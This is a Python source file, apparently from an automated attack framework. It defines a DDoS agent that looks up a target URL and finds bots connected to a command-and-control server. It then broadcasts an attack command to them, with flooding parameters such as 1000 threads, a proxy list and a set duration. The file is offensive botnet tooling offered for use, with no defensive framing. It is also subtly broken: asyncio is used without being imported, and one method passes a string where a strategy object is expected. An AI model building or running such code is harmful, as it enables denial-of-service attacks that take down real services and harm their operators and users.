
import os
from core.data_models import AgentData, Strategy
from core.data_models import Strategy, DDoSReport, AttackPhase, ErrorType
from core.logger import log
from typing import Optional
from core.botnet_manager import BotnetManager
import time

from core.base_agent import BaseAgent


class DDoSAgent(BaseAgent):
    supported_phases = ["IMPACT"]  # Assuming AttackPhase enum is not available
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.botnet_manager: Optional[BotnetManager] = None
        self.report_class = DDoSReport # Set report class

    async def setup(self):
        """Asynchronous setup method for DDoSAgent."""
        self.botnet_manager = await self.context_manager.get_context('botnet_manager')

    async def run(self, strategy: Strategy, **kwargs) -> DDoSReport:
        start_time = time.time()
        target_url = await self.context_manager.get_context('target_url')
        log.info(
            f"DDoSAgent: Received strategy to orchestrate a distributed attack on {target_url}")

        if not self.botnet_manager or not self.botnet_manager.running:
            summary = "BotnetManager is not available or not running."
            log.error(summary)
            end_time = time.time()
            return DDoSReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                target=target_url,
                errors=[summary],
                error_type=ErrorType.CONFIGURATION,
                summary=summary
            )

        connected_bots = self.botnet_manager.list_bots()
        if not connected_bots:
            summary = "No bots are connected to the C2 server. Cannot launch a distributed attack."
            log.warning(summary)
            end_time = time.time()
            return DDoSReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                target=target_url,
                errors=[summary],
                error_type=ErrorType.NETWORK,
                summary=summary
            )

        log.info(f"{len(connected_bots)} bot(s) are available for the attack.")

        # Get dynamic parameters from strategy context, with fallbacks
        attack_method = strategy.context.get("method", "GET")
        duration = strategy.context.get("duration", 300)  # Default 5 minutes
        threads = strategy.context.get("threads", 1000)  # Default 1000 threads
        rpc = strategy.context.get("rpc", 100)
        sockets = strategy.context.get("sockets", 500)

        log.info(
            f"DDoS Parameters: Method={attack_method}, Duration={duration}s, Threads={threads}")

        # This is the payload string that the bot's `execute_attack` function will receive
        attack_payload = f"{attack_method} {target_url} {rpc} {threads} proxies.txt {duration} {sockets}"

        log.info(
            f"Broadcasting attack command to botnet with payload: {attack_payload}")

        try:
            broadcast_result = self.botnet_manager.broadcast_command(
                "attack", payload=attack_payload)

            if broadcast_result.get("status") == "success":
                num_sent = len(broadcast_result.get("results", {}))
                summary = f"Successfully broadcasted DDoS attack command to {num_sent}/{len(connected_bots)} bots."
                log.success(summary)
                end_time = time.time()
                return DDoSReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    target=target_url,
                    summary=summary,
                    output=f"Attack initiated on {target_url} using {len(connected_bots)} bots.",
                    findings=[]
                )
            else:
                summary = f"Failed to broadcast DDoS attack command: {broadcast_result.get('message')}"
                log.error(summary)
                end_time = time.time()
                return DDoSReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    target=target_url,
                    errors=[summary],
                    error_type=ErrorType.NETWORK,
                    summary=summary,
                    output=str(broadcast_result),
                    findings=[]
                )

        except Exception as e:
            summary = f"An unexpected error occurred while broadcasting the attack: {e}"
            log.critical(summary, exc_info=True)
            end_time = time.time()
            return DDoSReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                target=target_url,
                errors=[summary],
                error_type=ErrorType.LOGIC,
                summary=summary,
                output=str(e),
                findings=[]
            )

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute ddos agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
